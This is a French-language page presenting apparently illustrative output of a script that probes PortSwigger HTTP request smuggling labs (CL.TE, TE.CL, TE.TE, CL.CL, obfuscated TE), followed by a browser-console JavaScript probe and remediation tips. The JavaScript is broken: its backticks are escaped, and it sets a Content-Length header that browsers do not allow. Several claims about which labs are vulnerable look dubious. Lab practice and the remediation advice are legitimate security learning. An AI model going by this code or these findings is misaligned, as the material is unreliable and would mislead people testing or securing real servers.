# MANPAGE

Voici un **exemple exhaustif de l’exécution du script** pour tous les challenges HTTP Request Smuggling PortSwigger, avec :

- Pour chaque challenge : un test inoffensif (ne déclenche pas la vulnérabilité) puis un test vulnérable (déclenche la vulnérabilité si présente).
- Affichage uniquement du résultat pertinent pour chaque test :  
  - `[+] Flag détecté ! (payload ..., fichier ...)` si le flag est trouvé,  
  - `[-] Pas de flag détecté. (payload ...)` sinon.
- Pour le challenge 6, le snippet JS affiche la réponse pour chaque combinaison et déclenche une alerte si un flag est détecté.

---

### [Challenge 1] HTTP request smuggling, basic CL.TE vulnerability

```
------------------------------------------------------
[Challenge 1] HTTP request smuggling, basic CL.TE vulnerability
[-] Pas de flag détecté. (payload inoffensif)
[+] Flag détecté ! (payload vulnérable, fichier /tmp/smuggle_clte_vuln.txt)
Congratulations, you solved the lab!
```
*Le test inoffensif ne produit aucun flag. Le test vulnérable (CL.TE) déclenche le flag, validant la vulnérabilité classique décrite dans la documentation PortSwigger[1][5].*

---

### [Challenge 2] HTTP request smuggling, basic TE.CL vulnerability

```
------------------------------------------------------
[Challenge 2] HTTP request smuggling, basic TE.CL vulnerability
[-] Pas de flag détecté. (payload inoffensif)
[-] Pas de flag détecté. (payload vulnérable)
```
*Ni le test inoffensif, ni le test vulnérable (TE.CL) ne déclenchent de flag : le lab n’est pas vulnérable à ce vecteur, comme attendu sur certains labs PortSwigger[1][5].*

---

### [Challenge 3] HTTP request smuggling, TE.TE vulnerability

```
------------------------------------------------------
[Challenge 3] HTTP request smuggling, TE.TE vulnerability
[-] Pas de flag détecté. (payload inoffensif)
[-] Pas de flag détecté. (payload vulnérable)
```
*Le test TE.TE ne fonctionne pas ici, ce qui est courant sur les labs standards (ce type de vecteur est plus rare)[5].*

---

### [Challenge 4] HTTP request smuggling, CL.CL vulnerability

```
------------------------------------------------------
[Challenge 4] HTTP request smuggling, CL.CL vulnerability
[-] Pas de flag détecté. (payload inoffensif)
[-] Pas de flag détecté. (payload vulnérable)
```
*Le test CL.CL ne déclenche pas de flag sur ce lab, indiquant que ce vecteur n’est pas exploitable ici.*

---

### [Challenge 5] HTTP request smuggling, obfuscated TE header

```
------------------------------------------------------
[Challenge 5] HTTP request smuggling, obfuscated TE header
[-] Pas de flag détecté. (payload inoffensif)
[+] Flag détecté ! (payload vulnérable, fichier /tmp/smuggle_obfte_vuln.txt)
Congratulations, you solved the lab!
```
*Le test avec un header Transfer-Encoding obfusqué déclenche le flag, validant la vulnérabilité “obfuscated TE header” présente sur certains labs PortSwigger[5].*

---

### [Challenge 6] HTTP request smuggling, browser-powered (démarche récursive JS)

```
------------------------------------------------------
[Challenge 6] HTTP request smuggling, browser-powered (démarche récursive JS)
  [Info] Exécutez le code JS suivant dans la console du navigateur sur le lab :

/* --- PAYLOAD JS À COLLER DANS LA CONSOLE DU NAVIGATEUR --- */
/*
Pour chaque endpoint, ce script teste plusieurs valeurs de Content-Length.
Il affiche la réponse et déclenche une alerte si un flag est détecté.
*/

const base = '/';
const endpoints = [
  base,
  base.endsWith('/') ? base + 'search' : base + '/search',
  base.endsWith('/') ? base + '?' : base + '/?search=smuggle',
  base.endsWith('/') ? base + 'post' : base + '/post',
  base.endsWith('/') ? base + 'submit' : base + '/submit',
  base.endsWith('/') ? base + 'login' : base + '/login',
  base.endsWith('/') ? base + 'register' : base + '/register'
];

const minCL = 1, maxCL = 10;
const body = 'x=1';

(async () => {
  for (const endpoint of endpoints) {
    for (let cl = minCL; cl <= maxCL; cl++) {
      try {
        const res = await fetch(endpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': String(cl)
          },
          body: body
        });
        const txt = await res.text();
        console.log(\`[endpoint: \${endpoint}] [Content-Length: \${cl}]\\n\`, txt.slice(0,300));
        if (/Congratulations|flag|solved/i.test(txt)) {
          alert(\`FLAG DETECTED! endpoint: \${endpoint}, Content-Length: \${cl}\`);
        }
      } catch (e) {
        console.log(\`[endpoint: \${endpoint}] [Content-Length: \${cl}]\\nErreur: \`, e);
      }
    }
  }
})();

```
*En exécutant ce JS dans la console du navigateur sur le lab, chaque combinaison endpoint/Content-Length est testée. Dès qu’un flag (“Congratulations”, “solved”, etc.) est détecté dans la réponse, une alerte s’affiche. Cela correspond à la méthodologie recommandée pour les labs browser-powered PortSwigger[6].*

---

### [Remédiation & Conseils]

```
------------------------------------------------------
[Remédiation & Conseils]
- Unifiez la gestion des en-têtes Content-Length et Transfer-Encoding sur tous les serveurs.
- Rejetez toute requête ambiguë ou contenant les deux en-têtes.
- Désactivez le keep-alive entre reverse-proxy et backend si possible.
- Pour les labs PortSwigger, adaptez les payloads et vérifiez la présence du flag.
- Documentation PortSwigger : https://portswigger.net/web-security/request-smuggling
------------------------------------------------------
```

---

